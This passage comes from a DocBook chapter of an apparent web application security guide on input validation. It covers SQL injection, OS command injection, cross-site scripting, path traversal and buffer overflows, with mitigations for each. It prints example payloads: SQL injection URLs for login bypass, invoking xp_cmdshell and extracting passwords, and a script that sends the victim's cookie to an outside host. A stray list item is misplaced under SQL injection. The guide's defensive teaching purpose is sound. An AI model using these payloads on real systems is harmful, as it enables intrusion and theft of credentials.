      We cannot emphasize strongly enough that "Accept Only Known
      Valid Data" is the best strategy. We do, however, recognize that
      this isn't always feasible for political, financial or technical
      reasons, and so we describe the other strategies as well.
      </para>
		<para>
      All three methods must check:
      </para>
		<itemizedlist mark="opencircle" spacing="compact">
			<listitem>
				<para>
            Data Type
            </para>
			</listitem>
			<listitem>
				<para>
            Syntax
            </para>
			</listitem>
			<listitem>
				<para>
            Length
            </para>
			</listitem>
		</itemizedlist>
		<para>
      Data type checking is extremely important. For instance, the
      application should check to ensure an integer is being submitted
      and not a string.
      </para>
		<sect2>
			<title>Accept Only Known Valid Data</title>
			<para>
         As we mentioned, this is the preferred way to validate
         data. Applications should accept only input that is known to
         be safe and expected. As an example, let's assume a password
         reset system takes in usernames as input. Valid usernames
         would be defined as ASCII A-Z and 0-9. The application should
         check that the input is of type string, is comprised of A-Z
         and 0-9 (performing cannibalization checks as appropriate)
         and is of a valid length.
         </para>
			<para>
         A common problem is numeric id fields such as:
         </para>
			<programlisting>
         http://www.example.com/example.asp?newsId=32
         </programlisting>
			<para>
         that do not check whether the id field is a number.  Rather
         than setting up elaborate checks for what is bad, a simple
         test of is this parameter a positive integer would protect
         the field.
         </para>
			<para>
         To properly accept only known valid data, a validation
         strategy must check:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               Data type
               </para>
				</listitem>
				<listitem>
					<para>
               Min and Max lengths
               </para>
				</listitem>
				<listitem>
					<para>
               Required fields
               </para>
				</listitem>
				<listitem>
					<para>
               If there is an enumerated list of possible values, that
               the value is in that list
               </para>
				</listitem>
				<listitem>
					<para>
               If there is a specific format or mask, that the value
               conforms to that format
               </para>
				</listitem>
				<listitem>
					<para>
               That canonical forms are properly handled
               </para>
				</listitem>
				<listitem>
					<para>
               For free form fields, only accepted characters are
               allowed
               </para>
				</listitem>
				<listitem>
					<para>
               If any risky characters must be allowed, the value must
               be properly sanitized
               </para>
				</listitem>
			</itemizedlist>
	    <para>
	    The discussion above implies that each data input parameter
	    must be checked in isolation. Indeed for attributes like
	    type, length and whether the field is required or not the
	    implication is valid. However, it would be a mistake
	    to take this implication too far. When analyzing input
	    data the system should not assume that a Prefix Connector, Payload and
	    Suffix Connector all need to arrive in the same data
	    parameter. In fact the prefix might arrive in one data
	    parameter, the payload in another and the suffix in a third.
	    The application may be concatenating the strings to consturct
	    a query, to render HTML or to submit a file system request.
	    Therefore, it is important that validation be done on the assumption
	    that a character constituting a prefix is dangerous even if the
	    suffix is not found or no possible payload is found within
	    that same parameter.
	    </para>

	</sect2>
		<sect2>
			<title>Reject Known Bad Data</title>
			<para>
         The rejecting bad data strategy relies on the application
         knowing about specific malicious payloads. While it is true
         that this strategy can limit exposure, it is very difficult
         for any application to maintain an up-to-date database of web
         application attack signatures.
         </para>
		</sect2>
		<sect2>
			<title>Sanitize All Data</title>
			<para>
         Attempting to make bad data harmless is certainly an
         effective second line of defense, especially when dealing
         with rejecting bad input. However, as described in the
         canonicalization section of this document, the task is
         extremely hard and should not be relied upon as a primary
         defense technique.
         </para>
			<para>
         Sanitization usually relies on transforming the data into a
         representation, which does not pose a risk, but allows a
         normal user to interact with the application without being
         aware the security checks are present.  Some examples of this
         include:
         </para>
			<table frame="all">
				<title/>
				<tgroup cols="2" align="left" colsep="1" rowsep="1">
					<colspec colname="c1"/>
					<colspec colname="c2"/>
					<thead>
						<row>
							<entry align="center">
                     Change this . . .
                     </entry>
							<entry align="center">
                     . . . To this
                     </entry>
						</row>
					</thead>
					<tbody>
						<row>
							<entry>
                     '
                     </entry>
							<entry>
                     '' (two single quotes)
                     </entry>
						</row>
						<row>
							<entry>
                     &lt;
                     </entry>
							<entry>
                     &amp;lt;
                     </entry>
						</row>
						<row>
							<entry>
                     &gt;
                     </entry>
							<entry>
                     &amp;gt;
                     </entry>
						</row>
						<row>
							<entry>
                     &amp;
                     </entry>
							<entry>
                     &amp;amp;
                     </entry>
						</row>
						<row>
							<entry>
                     &quot;
                     </entry>
							<entry>
                     &amp;quot;
                     </entry>
						</row>
					</tbody>
				</tgroup>
			</table>
		</sect2>
		<sect2>
			<title>Never Rely on Client-Side Data Validation</title>
			<para>
         Client-side validation can always be bypassed. All data
         validation must be done on the trusted server or under
         control of the application. With any client-side processing
         an attacker can simply watch the return value and modify it
         at will. This seems surprisingly obvious, yet many sites
         still validate users, including login, using only client-side
         code such as JavaScript. Data validation on the client side,
         for purposes of ease of use or user friendliness, is
         acceptable, but should not be considered a true validation
         process. All validation should be on the server side, even if
         it is redundant to cursory validation performed on the client
         side.
         </para>
			<para>
         Client-side validation includes more than just JavaScript.
         Some common client-side validation misconceptions include:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               the maxlength attribute will limit how much info a user
               can enter
               </para>
				</listitem>
				<listitem>
					<para>
               the readonly attribute will prevent a user from
               changing a value
               </para>
				</listitem>
				<listitem>
					<para>
               hidden form fields cannot be changed
               </para>
				</listitem>
				<listitem>
					<para>
               session cookies cannot be changed
               </para>
				</listitem>
				<listitem>
					<para>
               dropdown list or radio buttons limit choices
               </para>
				</listitem>
				<listitem>
					<para>
               all of the fields in the form will be supplied
               </para>
				</listitem>
				<listitem>
					<para>
               only the fields in the form will be supplied
               </para>
				</listitem>
			</itemizedlist>
			<para>
         If the client supplies the information it cannot be trusted.
         Since most quality assurance testing of web applications
         simply uses the user interface as the developers intended,
         many of these issues go unnoticed.  These client-side checks
         are some of the easiest things an attacker has to work
         around.
         </para>
		</sect2>
	</sect1>
	<sect1>
		<title>Specific Vulnerabilities</title>
		<para>
      This section discusses many of the common vulnerabilities that
      result from a failure to properly protect an application from
      data input vulnerabilities.  These issues tend to be some of the
      most common and dangerous attacks found in web applications.
      This section discusses these vulnerabilities in the context of
      the foundation built in this chapter on how these attacks work
      in general and how they should be protected against.
      </para>
		<sect2>
			<title>SQL Injection</title>
			<sect3>
				<title>Description</title>
				<para>
            Well-designed applications insulate the users from
            business logic. Some applications however do not validate
            user input and allow malicious users to make direct
            database calls to the database. This attack, called direct
            SQL injection, is surprisingly simple.
            </para>
				<para>
            Imagine a login screen to a web application. When the user
            enters his user ID and password in the web form, his
            browser is creating an HTTP request to the web application
            and sending the data. This should be done over SSL to
            protect the data in transit.
            </para>
				<para>
            That typical request actually may look like this (A GET
            request is used here for demonstration. In practice this
            should be done using a POST):
            </para>
				<programlisting>
            http://www.victim.com/login?userID=asmith&amp;password=Catch22
            </programlisting>
				<para>
            The application that receives this request takes the two
            sets of parameters supplied as input:
            </para>
				<programlisting>
            userID=asmith
            password=Catch22
            </programlisting>
				<para>
            The application builds a database query that will check
            the user ID and password to authenticate the user. That
            database query may look like this:
            </para>
				<programlisting>
            SELECT * FROM usertable WHERE userID = '$INPUT[userID]' AND password = '$INPUT[password]';
            </programlisting>
				<para>
            All works just fine until the attacker comes along and
            figures out he can modify the SQL command that actually
            gets processed and executed. Here he uses a user ID he
            does not have a password for and is not authorized to
            access. For instance:
            </para>
				<programlisting>
            http://www.victim.com/login?userID=admin'--&amp;password=
            </programlisting>
				<para>
            The resulting SQL now appears like this:
            </para>
				<programlisting>
            SELECT * FROM usertable WHERE userID = 'admin'--
            </programlisting>
				<para>
            The consequences are devastating. The - comments out the
            rest of the SQL command causing the retrieval to ignore
            the value in the password field.  The attacker has been
            able to bypass the administrative password and
            authenticate as the admin user.  A badly designed web
            application means hackers are able to retrieve and place
            data in authoritative systems of record at will.
            </para>
				<para>
            Direct SQL Injection can be use to:
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               the maxlength attribute will limit how much info a user
               can enter
               </para>
					</listitem>
				</itemizedlist>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               change SQL values
               </para>
					</listitem>
					<listitem>
						<para>
               concatenate SQL statements
               </para>
					</listitem>
					<listitem>
						<para>
               add function calls and stored-procedures to a statement
               </para>
					</listitem>
					<listitem>
						<para>
               typecast and concatenate retrieved data
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Some examples are shown below to demonstrate these
            techniques.
            </para>
				<para>
            Changing SQL Values
            </para>
				<programlisting>
            UPDATE usertable SET pwd='$INPUT[pwd]' WHERE uid='$INPUT[uid]';
            </programlisting>
				<para>
            Malicious HTTP request
            </para>
				<programlisting>
            http://www.victim.com/changePassword?pwd=ngomo&amp;uid=1'+or+uid+like'%25admin%25';--
            </programlisting>
				<para>
            Concatenating SQL Statements
            </para>
				<programlisting>
            SELECT id,name FROM products WHERE id LIKE '%$INPUT[prod]%';
            </programlisting>
				<para>
            Malicious HTTP request
            </para>
				<programlisting>
            http://www.victim.com/products?prod=0';insert+into+pg_shadow+(usename)+values+('hoschi');--
            </programlisting>
				<para>
            Adding function calls and stored-procedures to a statement
            </para>
				<programlisting>
            SELECT id,name FROM products WHERE id LIKE '%$INPUT[prod]%';
            </programlisting>
				<para>
            Malicious HTTP request
            </para>
				<programlisting>
            http://www.victim.com/products?prod=0';EXEC+master..xp_cmdshell('dir');--
            </programlisting>
				<para>
            Typecast and concatenate retrieved data
            </para>
				<programlisting>
            SELECT id,title FROM newsTable WHERE category = $INPUT[catid];
            </programlisting>
				<para>
            Malicious HTTP request
            </para>
				<programlisting>
            http://www.victim.com/news?catID=0+UNION+SELECT+1,concat(userID||'-'||password)+FROM+userTable;--
            </programlisting>
			</sect3>
			<sect3>
				<title>Mitigation Techniques</title>
				<para>
            If your input validation strategy is to only accept
            expected input then the problem is significantly
            reduced. However this approach is unlikely to stop all SQL
            injection attacks and can be difficult to implement if the
            input filtering algorithm has to decide whether the data
            is destined to become part of a query or not, and if it
            has to know which database such a query might be run
            against. For example, a user who enters the last name
            "O'Neil" into a form includes the special meta-character
            ('). This input must be allowed, since it is a legitimate
            part of a name, but it may need to be escaped if it
            becomes part of a database query. Different databases may
            require that the character be escaped differently,
            however, so it would also be important to know for which
            database the data must be sanitized. Fortunately, there is
            usually a very good solution to this problem.
            </para>
				<para>
            The best way to protect a system against SQL injection
            attacks is to construct all queries with prepared
            statements and/or parameterized stored procedures. A
            prepared statement, or parameterized stored procedure,
            encapsulates variables and should escape special
            characters within them automatically and in a manner
            suited to the target database.
            </para>
				<para>
            Common database API's offer developers two different means
            of writing a SQL query. For example, in JDBC, the standard
            Java API for relational database queries, one can write a
            query either using a PreparedStatement or as a simple
            String. The preferred method from both a performance and a
            security standpoint should be to use
            PreparedStatements. 
	    </para>
				<para>
	    With a PreparedStatement, the general
            query is written using a ? as a placeholder for a
            parameter value. Parameter values are substituted as a
            second step. The substitution should be done by the JDBC
            driver such that the value can only be interpreted as the
            value for the parameter intended and any special
            characters within it should be automatically escaped by
            the driver for the database it targets. Different
            databases escape characters in different ways, so allowing
            the JDBC driver to handle this function also makes the
            system more portable.
            </para>
				<para>
            Common database interface layers in other languages offer
            similar protections. The Perl DBI module, for example,
            allows for prepared statements to be made in a way very
            similar to the JDBC PreparedStatement. Developers should
            test the behavior of prepared statements in their system
            early in the development cycle.
            </para>
				<para>
	    Parameterized stored procedures are a related technique 
	    that can also mitigate SQL Injection attacks and also have
	    the benefit of executing faster in most cases. Most RDBMS
	    systems offer a means of writing an embedded procedure
	    that will execute a SQL statement using parameters provided
	    during the procedure call. Typically these procedures are
	    written in a proprietary Fourth Generation Language (4GL)
	    such as PL/SQL for Oracle. 
	    </para>
				<para>
	    When stored procedures are used, the application calls the
	    procedure passing parameters, rather than constructing the
	    SQL query itself. Like PreparedStatements in JDBC, 
	    the stored procedure does the substitution in a manner 
	    that is safe for that database.	    
	    </para>
				<para>
            Use of prepared statements or stored procedures is not a
	    panacea. The JDBC specification does NOT require a JDBC
	    driver to properly escape special characters. Many
	    commercial JDBC drivers will do this correctly, but some
	    definitely do not. Developers should test their JDBC
	    drivers with their target database. Fortunately it is
	    often easy to switch from a bad driver to a good
	    one. Writing stored procedures for all database access is
	    often not practical and can greatly reduce application
	    portability across different databases.
	    </para>
				<para>
	    Because of these limitations and the lack of available 
	    analogues to these techniques in some application development
	    platforms, proper input data validation is still strongly 
	    recommended. This includes proper canonicalization of data
	    since a driver may only recognize the characters to be 
	    escaped in one of many encodings. Defense in depth implies that all available
	    techniques should be used if possible. Careful consideration of a
	    data validation technique for prevention of SQL Injection
	    attacks is a critical security issue.
            </para>
				<para>
            Wherever possible use the "only accept known good data"
            strategy and fall back to sanitizing the data for
            situations such as "O'Neil". In those cases, the
            application should filter special characters used in SQL
            statements. These characters can vary depending on the 
	    database used but often include "+", "-", "," "'" (single quote), 
	    '"' (double quote), "_", "*", ";", "|", "?", "&amp;" and "=".
            </para>
				<para>
            Further Reading
            </para>
	    <para>
	    Appendix C in this document contains source code samples
	    for SQL Injection Mitigation.
	    </para>
				<para>
            http://www.nextgenss.com/papers/advanced_sql_injection.pdf
            </para>
				<para>
            http://www.sqlsecurity.com/faq-inj.asp
            </para>
				<para>
            http://www.spidynamics.com/papers/SQLInjectionWhitePaper.pdf
            </para>
				<para>
            http://www.nextgenss.com/papers/advanced_sql_injection.pdf
            </para>
				<para>
            http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf
            </para>
			</sect3>
		</sect2>
		<sect2>
			<title>OS Command Injection</title>
			<sect3>
				<title>Description</title>
				<para>
            Nearly every programming language allows the use of so
            called "system-commands", and many applications make use
            of this type of functionality. System-interfaces in
            programming and scripting languages pass input (commands)
            to the underlying operating system. The operating system
            executes the given input and returns its output to stdout
            along with various return-codes to the application such as
            successful, not successful etc.
            </para>
				<para>
            System commands can be a very convenient feature, which
            with little effort can be integrated into a
            web-application. Common usage for these commands in web
            applications are file handling (remove,copy), sending
            emails and calling operating system tools to modify the
            applications input and output in various ways (filters).
            </para>
				<para>
            Depending on the scripting or programming language and the
            operating-system it is possible to:
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               Alter system commands
               </para>
					</listitem>
					<listitem>
						<para>
               Alter parameters passed to system commands
               </para>
					</listitem>
					<listitem>
						<para>
               Execute additional commands and OS command line tools.
               </para>
					</listitem>
					<listitem>
						<para>
               Execute additional commands within executed command
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Some common techniques for calling system commands in
            various languages that should be carefully checked
            include:
            </para>
				<para>
            PHP
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               require()
               </para>
					</listitem>
					<listitem>
						<para>
               include()
               </para>
					</listitem>
					<listitem>
						<para>
               eval()
               </para>
					</listitem>
					<listitem>
						<para>
               preg_replace() (with /e modifier)
               </para>
					</listitem>
					<listitem>
						<para>
               exec()
               </para>
					</listitem>
					<listitem>
						<para>
               passthru()
               </para>
					</listitem>
					<listitem>
						<para>
               `` (backticks)
               </para>
					</listitem>
					<listitem>
						<para>
               system()
               </para>
					</listitem>
					<listitem>
						<para>
               popen()
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Shell Scripts
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               often problematic and dependent on the shell
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Perl
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               open()
               </para>
					</listitem>
					<listitem>
						<para>
               sysopen()
               </para>
					</listitem>
					<listitem>
						<para>
               glob()
               </para>
					</listitem>
					<listitem>
						<para>
               system()
               </para>
					</listitem>
					<listitem>
						<para>
               '' (backticks)
               </para>
					</listitem>
					<listitem>
						<para>
               eval()
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Java(Servlets, JSP's)
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               System.* (especially System.Runtime)
               </para>
					</listitem>
				</itemizedlist>
				<para>
            C &amp; C++
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               system()
               </para>
					</listitem>
					<listitem>
						<para>
               exec**()
               </para>
					</listitem>
					<listitem>
						<para>
               strcpy
               </para>
					</listitem>
					<listitem>
						<para>
               strcat
               </para>
					</listitem>
					<listitem>
						<para>
               sprintf
               </para>
					</listitem>
					<listitem>
						<para>
               vsprintf
               </para>
					</listitem>
					<listitem>
						<para>
               gets
               </para>
					</listitem>
					<listitem>
						<para>
               strlen
               </para>
					</listitem>
					<listitem>
						<para>
               scanf
               </para>
					</listitem>
					<listitem>
						<para>
               fscanf
               </para>
					</listitem>
					<listitem>
						<para>
               sscanf
               </para>
					</listitem>
					<listitem>
						<para>
               vscanf
               </para>
					</listitem>
					<listitem>
						<para>
               vsscanf
               </para>
					</listitem>
					<listitem>
						<para>
               vfscanf
               </para>
					</listitem>
					<listitem>
						<para>
               realpath
               </para>
					</listitem>
					<listitem>
						<para>
               getopt
               </para>
					</listitem>
					<listitem>
						<para>
               getpass
               </para>
					</listitem>
					<listitem>
						<para>
               streadd
               </para>
					</listitem>
					<listitem>
						<para>
               strecpy
               </para>
					</listitem>
					<listitem>
						<para>
               strtrns
               </para>
					</listitem>
				</itemizedlist>
			</sect3>
			<sect3>
				<title>Mitigation Techniques</title>
				<para>
            There are several techniques that can be used to mitigate
            the risk of passing malicious information to system
            commands.  The best way is to carefully limit all
            information passed to system commands to only known
            values.  If the options that can be passed to the system
            commands can be enumerated, that list can be checked and
            the system can ensure that no malicious information gets
            through.
            </para>
				<para>
            When the options cannot be enumerated, the other option is
            to limit the size to the smallest allowable length and to
            carefully sanitize the input for characters, which could
            be used to launch the execution of other commands.  Those
            characters will depend on the language used for the
            application, the specific technique of function being
            used, as well as the operating system the application runs
            on.  As always, checks will also have to be made for
            special formatting issues such as Unicoded characters.
            The complexity of all of these checks should make it very
            clear why the "only accept known valid data" is the best
            and easiest approach to implement.
            </para>
			</sect3>
		</sect2>
		<sect2>
			<title>HTML Injection (Cross-site Scripting)</title>
			<sect3>
				<title>Description</title>
				<para>
            HTML Injection, better known as Cross-site scripting,
	    has received a great deal of press
            attention. The name originated from the CERT advisory,
            CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in
            Client Web Requests
            [http://www.cert.org/advisories/CA-2000-02.html].
	    </para>

	    <para>
	    Although these attacks are most commonly known as "Cross-site Scripting"
	    (abbreviated XSS), the name is somewhat misleading.
	    The implication of the name "Cross-site Scripting" is that 
	    another site or external source must be involved in the
	    attack. Posting links on an external site that inject 
	    malicious HTML tags on another site is one way that an HTML 
	    Injection attack can be executed, but is by no means the only 
	    way. The confusion caused by the implication that another 
	    site must be involved has led some developers to underestimate 
	    the vulnerabilities of their systems to the full range of HTML 
	    Injection attacks.
	    </para>

	    <para>
	    HTML Injection attacks are exploited on the user's system and not the system 
            where the application resides. Of course if the user is an administrator of the
            system, that scenario can change. To explain the attack
            let's follow an example.
            </para>
	    <para>
	    Imagine a system offering message board services where one user can
	    post a message and other users can read it. Posted messages normally
	    contain just text, but an attacker could post a message that contains
	    HTML codes including embedded JavaScript. If the message are accepted
	    without proper input filtering, then the embedded codes and scripts
	    will be rendered in the broswers of those viewing the messages. What's
	    more, they will execute in the security context of the user viewing 
	    the message, not the user posting the message. 
	    </para>
	    <para>
	    In the above message-board example, imagine an attacker submits 
	    the following message. 
	    <programlisting>
	    "Hello, you are hacked. &lt;script&gt;alert(document.cookie)&lt;/script&gt;"
	    </programlisting>
	    When this message is rendered in the browser of a user
	    who reads the post, it would display that user's cookie
	    in an alert window. In this case, each user reading the message would
	    see his own cookie, but simple extensions to the above script
	    could deliver the cookies to the attacker. The following example
	    would leave the victim's cookie in the web log of a 
	    site owned by the attacker. If that cookie reveals an active
	    session id of another user or a system administrator it gives
	    the attacker an easy means of masquerading as that user in the
	    host system.
	    <programlisting>
            &lt;script&gt;document.write('&lt;img src="http://targetsite.com/'+document.cookie+'")&lt;/script&gt;
	    </programlisting>
	    </para>
	    <para>
	    The "cross-site" version of the above attack would be to
	    post a URL on another site that encoded similar malicious
	    scripts. An attacker's website might offer a link 
	    that reads, "click here to purchase this book at
	    Megabooks.com". Embedded into the link could be the
	    same malicious codes as in the above example. If Megabooks.com 
	    returned the unfiltered payload to the victim's browser, 
	    the cookie of a Megabooks.com account member would be sent to 
	    the attacker.
	    </para>
				<para>
            In the above examples, the payload is a simple JavaScript
	    command. Because modern client-side scripting languages now 
	    run beyond simple page formatting, a tremendous variety of
	    dangerous payloads can be constructed. In addition many clients
            are poorly written and rarely patched. These clients may
            be tricked into executing an even greater number of dangerous
	    functions.
            </para>
   	    <para>
	    There are four basic contexts for input within an HTML document.
	    While the basic technique is the same, all of these contexts require
	    different tests to be conducted to determine whether the application
	    is vulnerable to this form of HTML injection.
	    </para>
	    <itemizedlist mark="opencircle" spacing="compact">
		<listitem>
		  <para>

		Tags - This is the most common usage of HTML Injection
                and involves inserting tags such as &lt;SCRIPT&gt;,
                &lt;A&gt; &lt;IMG&gt; or &lt;IFRAME&gt; into the HTML
                document.  This context is used when the attack data
                is displayed as text in the HTML document.
		</para>
		</listitem>

		<listitem>
		<para>
		Events - An often-missed context is the use of
		scripting events, such as "onclick".  This context is usually 
		used when the payload is displayed to the user as an input 
		field or as an attribute of another tag. A form element
		attribute such as "onclick" can encode the same type of
		malicious JavaScript commands, executed when a user clicks
		on the form element, for example: 
		'" onclick="javascript:alert(123)'
		</para>
		</listitem>

		<listitem>
		<para>
		Indirect Scripting - Some web applications, such as message boards, allow
		limited HTML to be injected by the user.  This is
		sometime done using an intermediate tag library, which
		is translated by the application into HTML before
		returning the page to the browser.  For example, if:
		"[IMG]a.gif[/IMG]" generates the following HTML:
		"&lt;img src="a.gif"/&gt;" then the technique could be 
		exploited by an input such as this: 
		'[IMG]nonsense.gif" onerror="alert(1)[/IMG]'
		</para>
		</listitem>

		<listitem>
		<para>
		Direct Scripting - Other web applications will occassionally
		generate scripting code on the fly and include data that 
		originated from users in the script.  An example would be 
		this snippet of JavaScript code:

		<programlisting>
		&lt;SCRIPT&gt;
		function foo()
		{
		   document.myForm.myField.value = "user supplied data";
		   document.myForm.submit();
		}
		&lt;/SCRIPT&gt;
		</programlisting>
		</para>
		</listitem>
	    </itemizedlist>

	    <para>	  
            As the above examples show, there are many ways in which HTML Injection
            can be used. HTML Injection attacks are some of the easiest	for
	    attackers to uncover because of the immediate test-response cycles
	    and because of the limited knowledge of the
	    application structure required.  Malicious attacks can come from internal
	    users as well as outside users. Therefore, preventing HTML Injection attacks 
	    is absolutely essential, even for applications on an intranet or
	    other secure system.
            </para>
			</sect3>
			<sect3>
				<title>Mitigation Techniques</title>
				<para>
            If the web server does not specify which character
            encoding is in use, the client cannot tell which
            characters are special. Web pages with unspecified
            character-encoding work most of the time because most
            character sets assign the same characters to byte values
            below 128. Determining which characters above 128 are
            considered special is somewhat difficult.
            </para>
				<para>
            Web servers should set the character set, then make sure
            that the data they insert is free from byte sequences that
            are special in the specified encoding. This can typically
            be done by settings in the application server or web
            server. The server should define the character set in each
            html page as below.
            </para>
				<programlisting>
            &lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" /&gt;
            </programlisting>
				<para>
            The above tells the browser what character set should be
            used to properly display the page. In addition, most
            servers must also be configured to tell the browser what
            character set to use when submitting form data back to the
            server and what character set the server application
            should use internally. The configuration of each server
            for character set control is different, but is very
            important in understanding the canonicalization of input
            data. Control over this process also helps markedly with
            internationalization efforts.
            </para>
				<para>
            Filtering special meta characters is also important. HTML
            defines certain characters as "special", if they have an
            effect on page formatting.
            </para>
				<para>
            In an HTML body:
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               "&lt;" introduces a tag.
               </para>
					</listitem>
					<listitem>
						<para>
               "&amp;" introduces a character entity.
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Note : Some browsers try to correct poorly formatted HTML
            and treat "&gt;" as if it were "&lt;".
            </para>
				<para>
            In attributes:
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               double quotes mark the end of the attribute value.
               </para>
					</listitem>
					<listitem>
						<para>
               single quotes mark the end of the attribute value.
               </para>
					</listitem>
					<listitem>
						<para>
               "&amp;" introduces a character entity.
               </para>
					</listitem>
				</itemizedlist>
				<para>
            In URLs:
            </para>
				<itemizedlist mark="opencircle" spacing="compact">
					<listitem>
						<para>
               Space, tab, and new line denote the end of the URL.
               </para>
					</listitem>
					<listitem>
						<para>
               "&amp;" denotes a character entity or separates query
               string parameters.
               </para>
					</listitem>
					<listitem>
						<para>
               Non-ASCII characters (that is, everything above 128 in
               the ISO-8859-1 encoding) are not allowed in URLs.
               </para>
					</listitem>
					<listitem>
						<para>
               The "%" must be filtered from input anywhere parameters
               encoded with HTTP escape sequences are decoded by
               server-side code.
               </para>
					</listitem>
				</itemizedlist>
				<para>
            Ensuring correct encoding of dynamic output can prevent
            malicious scripts from being passed to the user. While
            this is no guarantee of prevention, it can help contain
            the problem in certain circumstances. The application can
            make an explicit decision to encode untrusted data and
            leave trusted data untouched, thus preserving mark-up
            content.
            </para>
				<para>
	    Encoding untrusted data can introduce additional problems
	    however. Encoding a "&lt;" in an untrusted stream means
	    converting it to "&amp;lt;". This conversion makes the string
	    longer, so any length checking of the input should be done
	    only after canonicalization and sanitization of the data.
	    </para>
	    
				<para>
            Further Reading
            </para>
	    <para>
	    Appendix B in this document contains source code samples
	    for Data Validation.
	    </para>
				<para>
            http://www.cert.org/tech_tips/malicious_code_mitigation.html
            </para>
			</sect3>
		</sect2>
		<sect2>
			<title>Path Traversal</title>
			<sect3>
				<title>Description</title>
				<para>
            Many web applications utilize the file system of the web
            server in a presentation tier to temporarily and/or
            permanently save information or load template or
            configuration files.  The WWW-ROOT directory is typically
            the virtual root directory within a web server, which is
            accessible to a HTTP Client. Web Applications may store
            data inside and/or outside WWW-ROOT in designated
            locations.
            </para>
				<para>
            If the application does NOT properly check and handle
            meta-characters used to describe paths, for example "../",
            it is possible that the application is vulnerable to a
            "Path Traversal" attack. The attacker can construct a
            malicious request to return files such as
            /etc/passwd. This is often referred to as a "file
            disclosure" vulnerability.
            </para>
				<para>
            Traversing back to system directories that contain
            binaries makes it possible to execute system commands
            OUTSIDE designated paths instead of simply opening,
            including or evaluating file.
            </para>
			</sect3>
			<sect3>
				<title>Mitigation Techniques</title>
				<para>
            Where possible make use of path normalization functions
            provided by your development language. Also remove
            offending path strings such as "../" as well as their
            Unicode variants from system input. Use of "chrooted"
            servers can also mitigate this issue.
            </para>
				<para>
            Above all else by only accepting expected input, the
            problem is significantly reduced. We cannot stress that
            this is the correct strategy enough!
            </para>
			</sect3>
		</sect2>
		<sect2>
			<title>Buffer Overflow</title>
			<sect3>
				<title>Description</title>
				<para>
            Attackers use buffer overflows to corrupt the execution
            stack of a web application.  By sending carefully crafted
            input to a web application, an attacker can cause the web
            application to execute arbitrary code - effectively taking
            over the machine.  Buffer overflows are not easy to
            discover and even when one is discovered, it is generally
            extremely difficult to exploit.  Nevertheless, attackers
            have managed to identify buffer overflows in a staggering
            array products and components.  Another very similar class
            of flaws is known as format string attacks.
            </para>
				<para>
            Buffer overflow flaws can be present in both the web
            server or application server products that serve the
            static and dynamic aspects of the site, or the web
            application itself.  Buffer overflows found in widely used
            server products are likely to become widely known and can
            pose a significant risk to users of these products.  When
            web applications use libraries, such as a graphics library
            to generate images, they open themselves to potential
            buffer overflow attacks.
            </para>
				<para>
            Buffer overflows can also be found in custom web
            application code, and may even be more likely given the
            lack of scrutiny that web applications typically go
            through.  Buffer overflow flaws in custom web applications
            are less likely to be detected because there will normally
            be far fewer hackers trying to find and exploit such flaws
            in a specific application.  If discovered in a custom
            application, the ability to exploit the flaw (other than
            to crash the application ) is significantly reduced by the
            fact that the source code and detailed error messages for
            the application may not be available to the hacker.
            </para>
				<para>
            Almost all known web servers, application servers and web
            application environments are susceptible to buffer
            overflows, the notable exception being Java and J2EE
            environments, which are immune to these attacks (except
            for overflows in the JVM itself).
            </para>
				<para>
            Aleph One, "Smashing the Stack for fun and profit",
            http://www.phrack.com/show.php?p+49&amp;a+14
            </para>
				<para>
            Mark Donaldson, "Inside the buffer Overflow Attack:
            Mechanism, method, &amp; Prevention,"
            http://rr.sans.org/code/inside_buffer.php
            </para>
			</sect3>
			<sect3>
				<title>Mitigation Techniques</title>
				<para>
            Keep up with the latest bug reports for your web and
            application server products and other products in your
            Internet infrastructure.  Apply the latest patches to
            these products.  Periodically scan your website with one
            or more of the commonly available scanners that look for
            buffer overflow flaws in your server products and your
            custom web applications.
            </para>
				<para>
            For your custom application code, you need to review all
            code that accepts input from users via the HTTP request
            and ensure that it provides appropriate size checking on
            all such inputs.  This should be done even for
            environments that are not susceptible to such attacks as
            overly large inputs that are uncaught may still cause
            denial of service or other operational problems.
            </para>
			</sect3>
		</sect2>
	</sect1>
	<sect1>
		<title>Summary</title>
		<para>
      This chapter covered the application security issues dealing
      with the failure to properly validate data input:
      </para>
		<itemizedlist mark="opencircle" spacing="compact">
			<listitem>
				<para>
         Input Sources - The various sources of input that an
         application needs to protect.
         </para>
			</listitem>
			<listitem>
				<para>
         Input Formats - The formatting and encoding schemes
         that an application needs to be aware of.
         </para>
			</listitem>
			<listitem>
				<para>
         Concept of Injection - The core concept of how
         injection attacks work.
         </para>
			</listitem>
		</itemizedlist>
	</sect1>
</chapter>
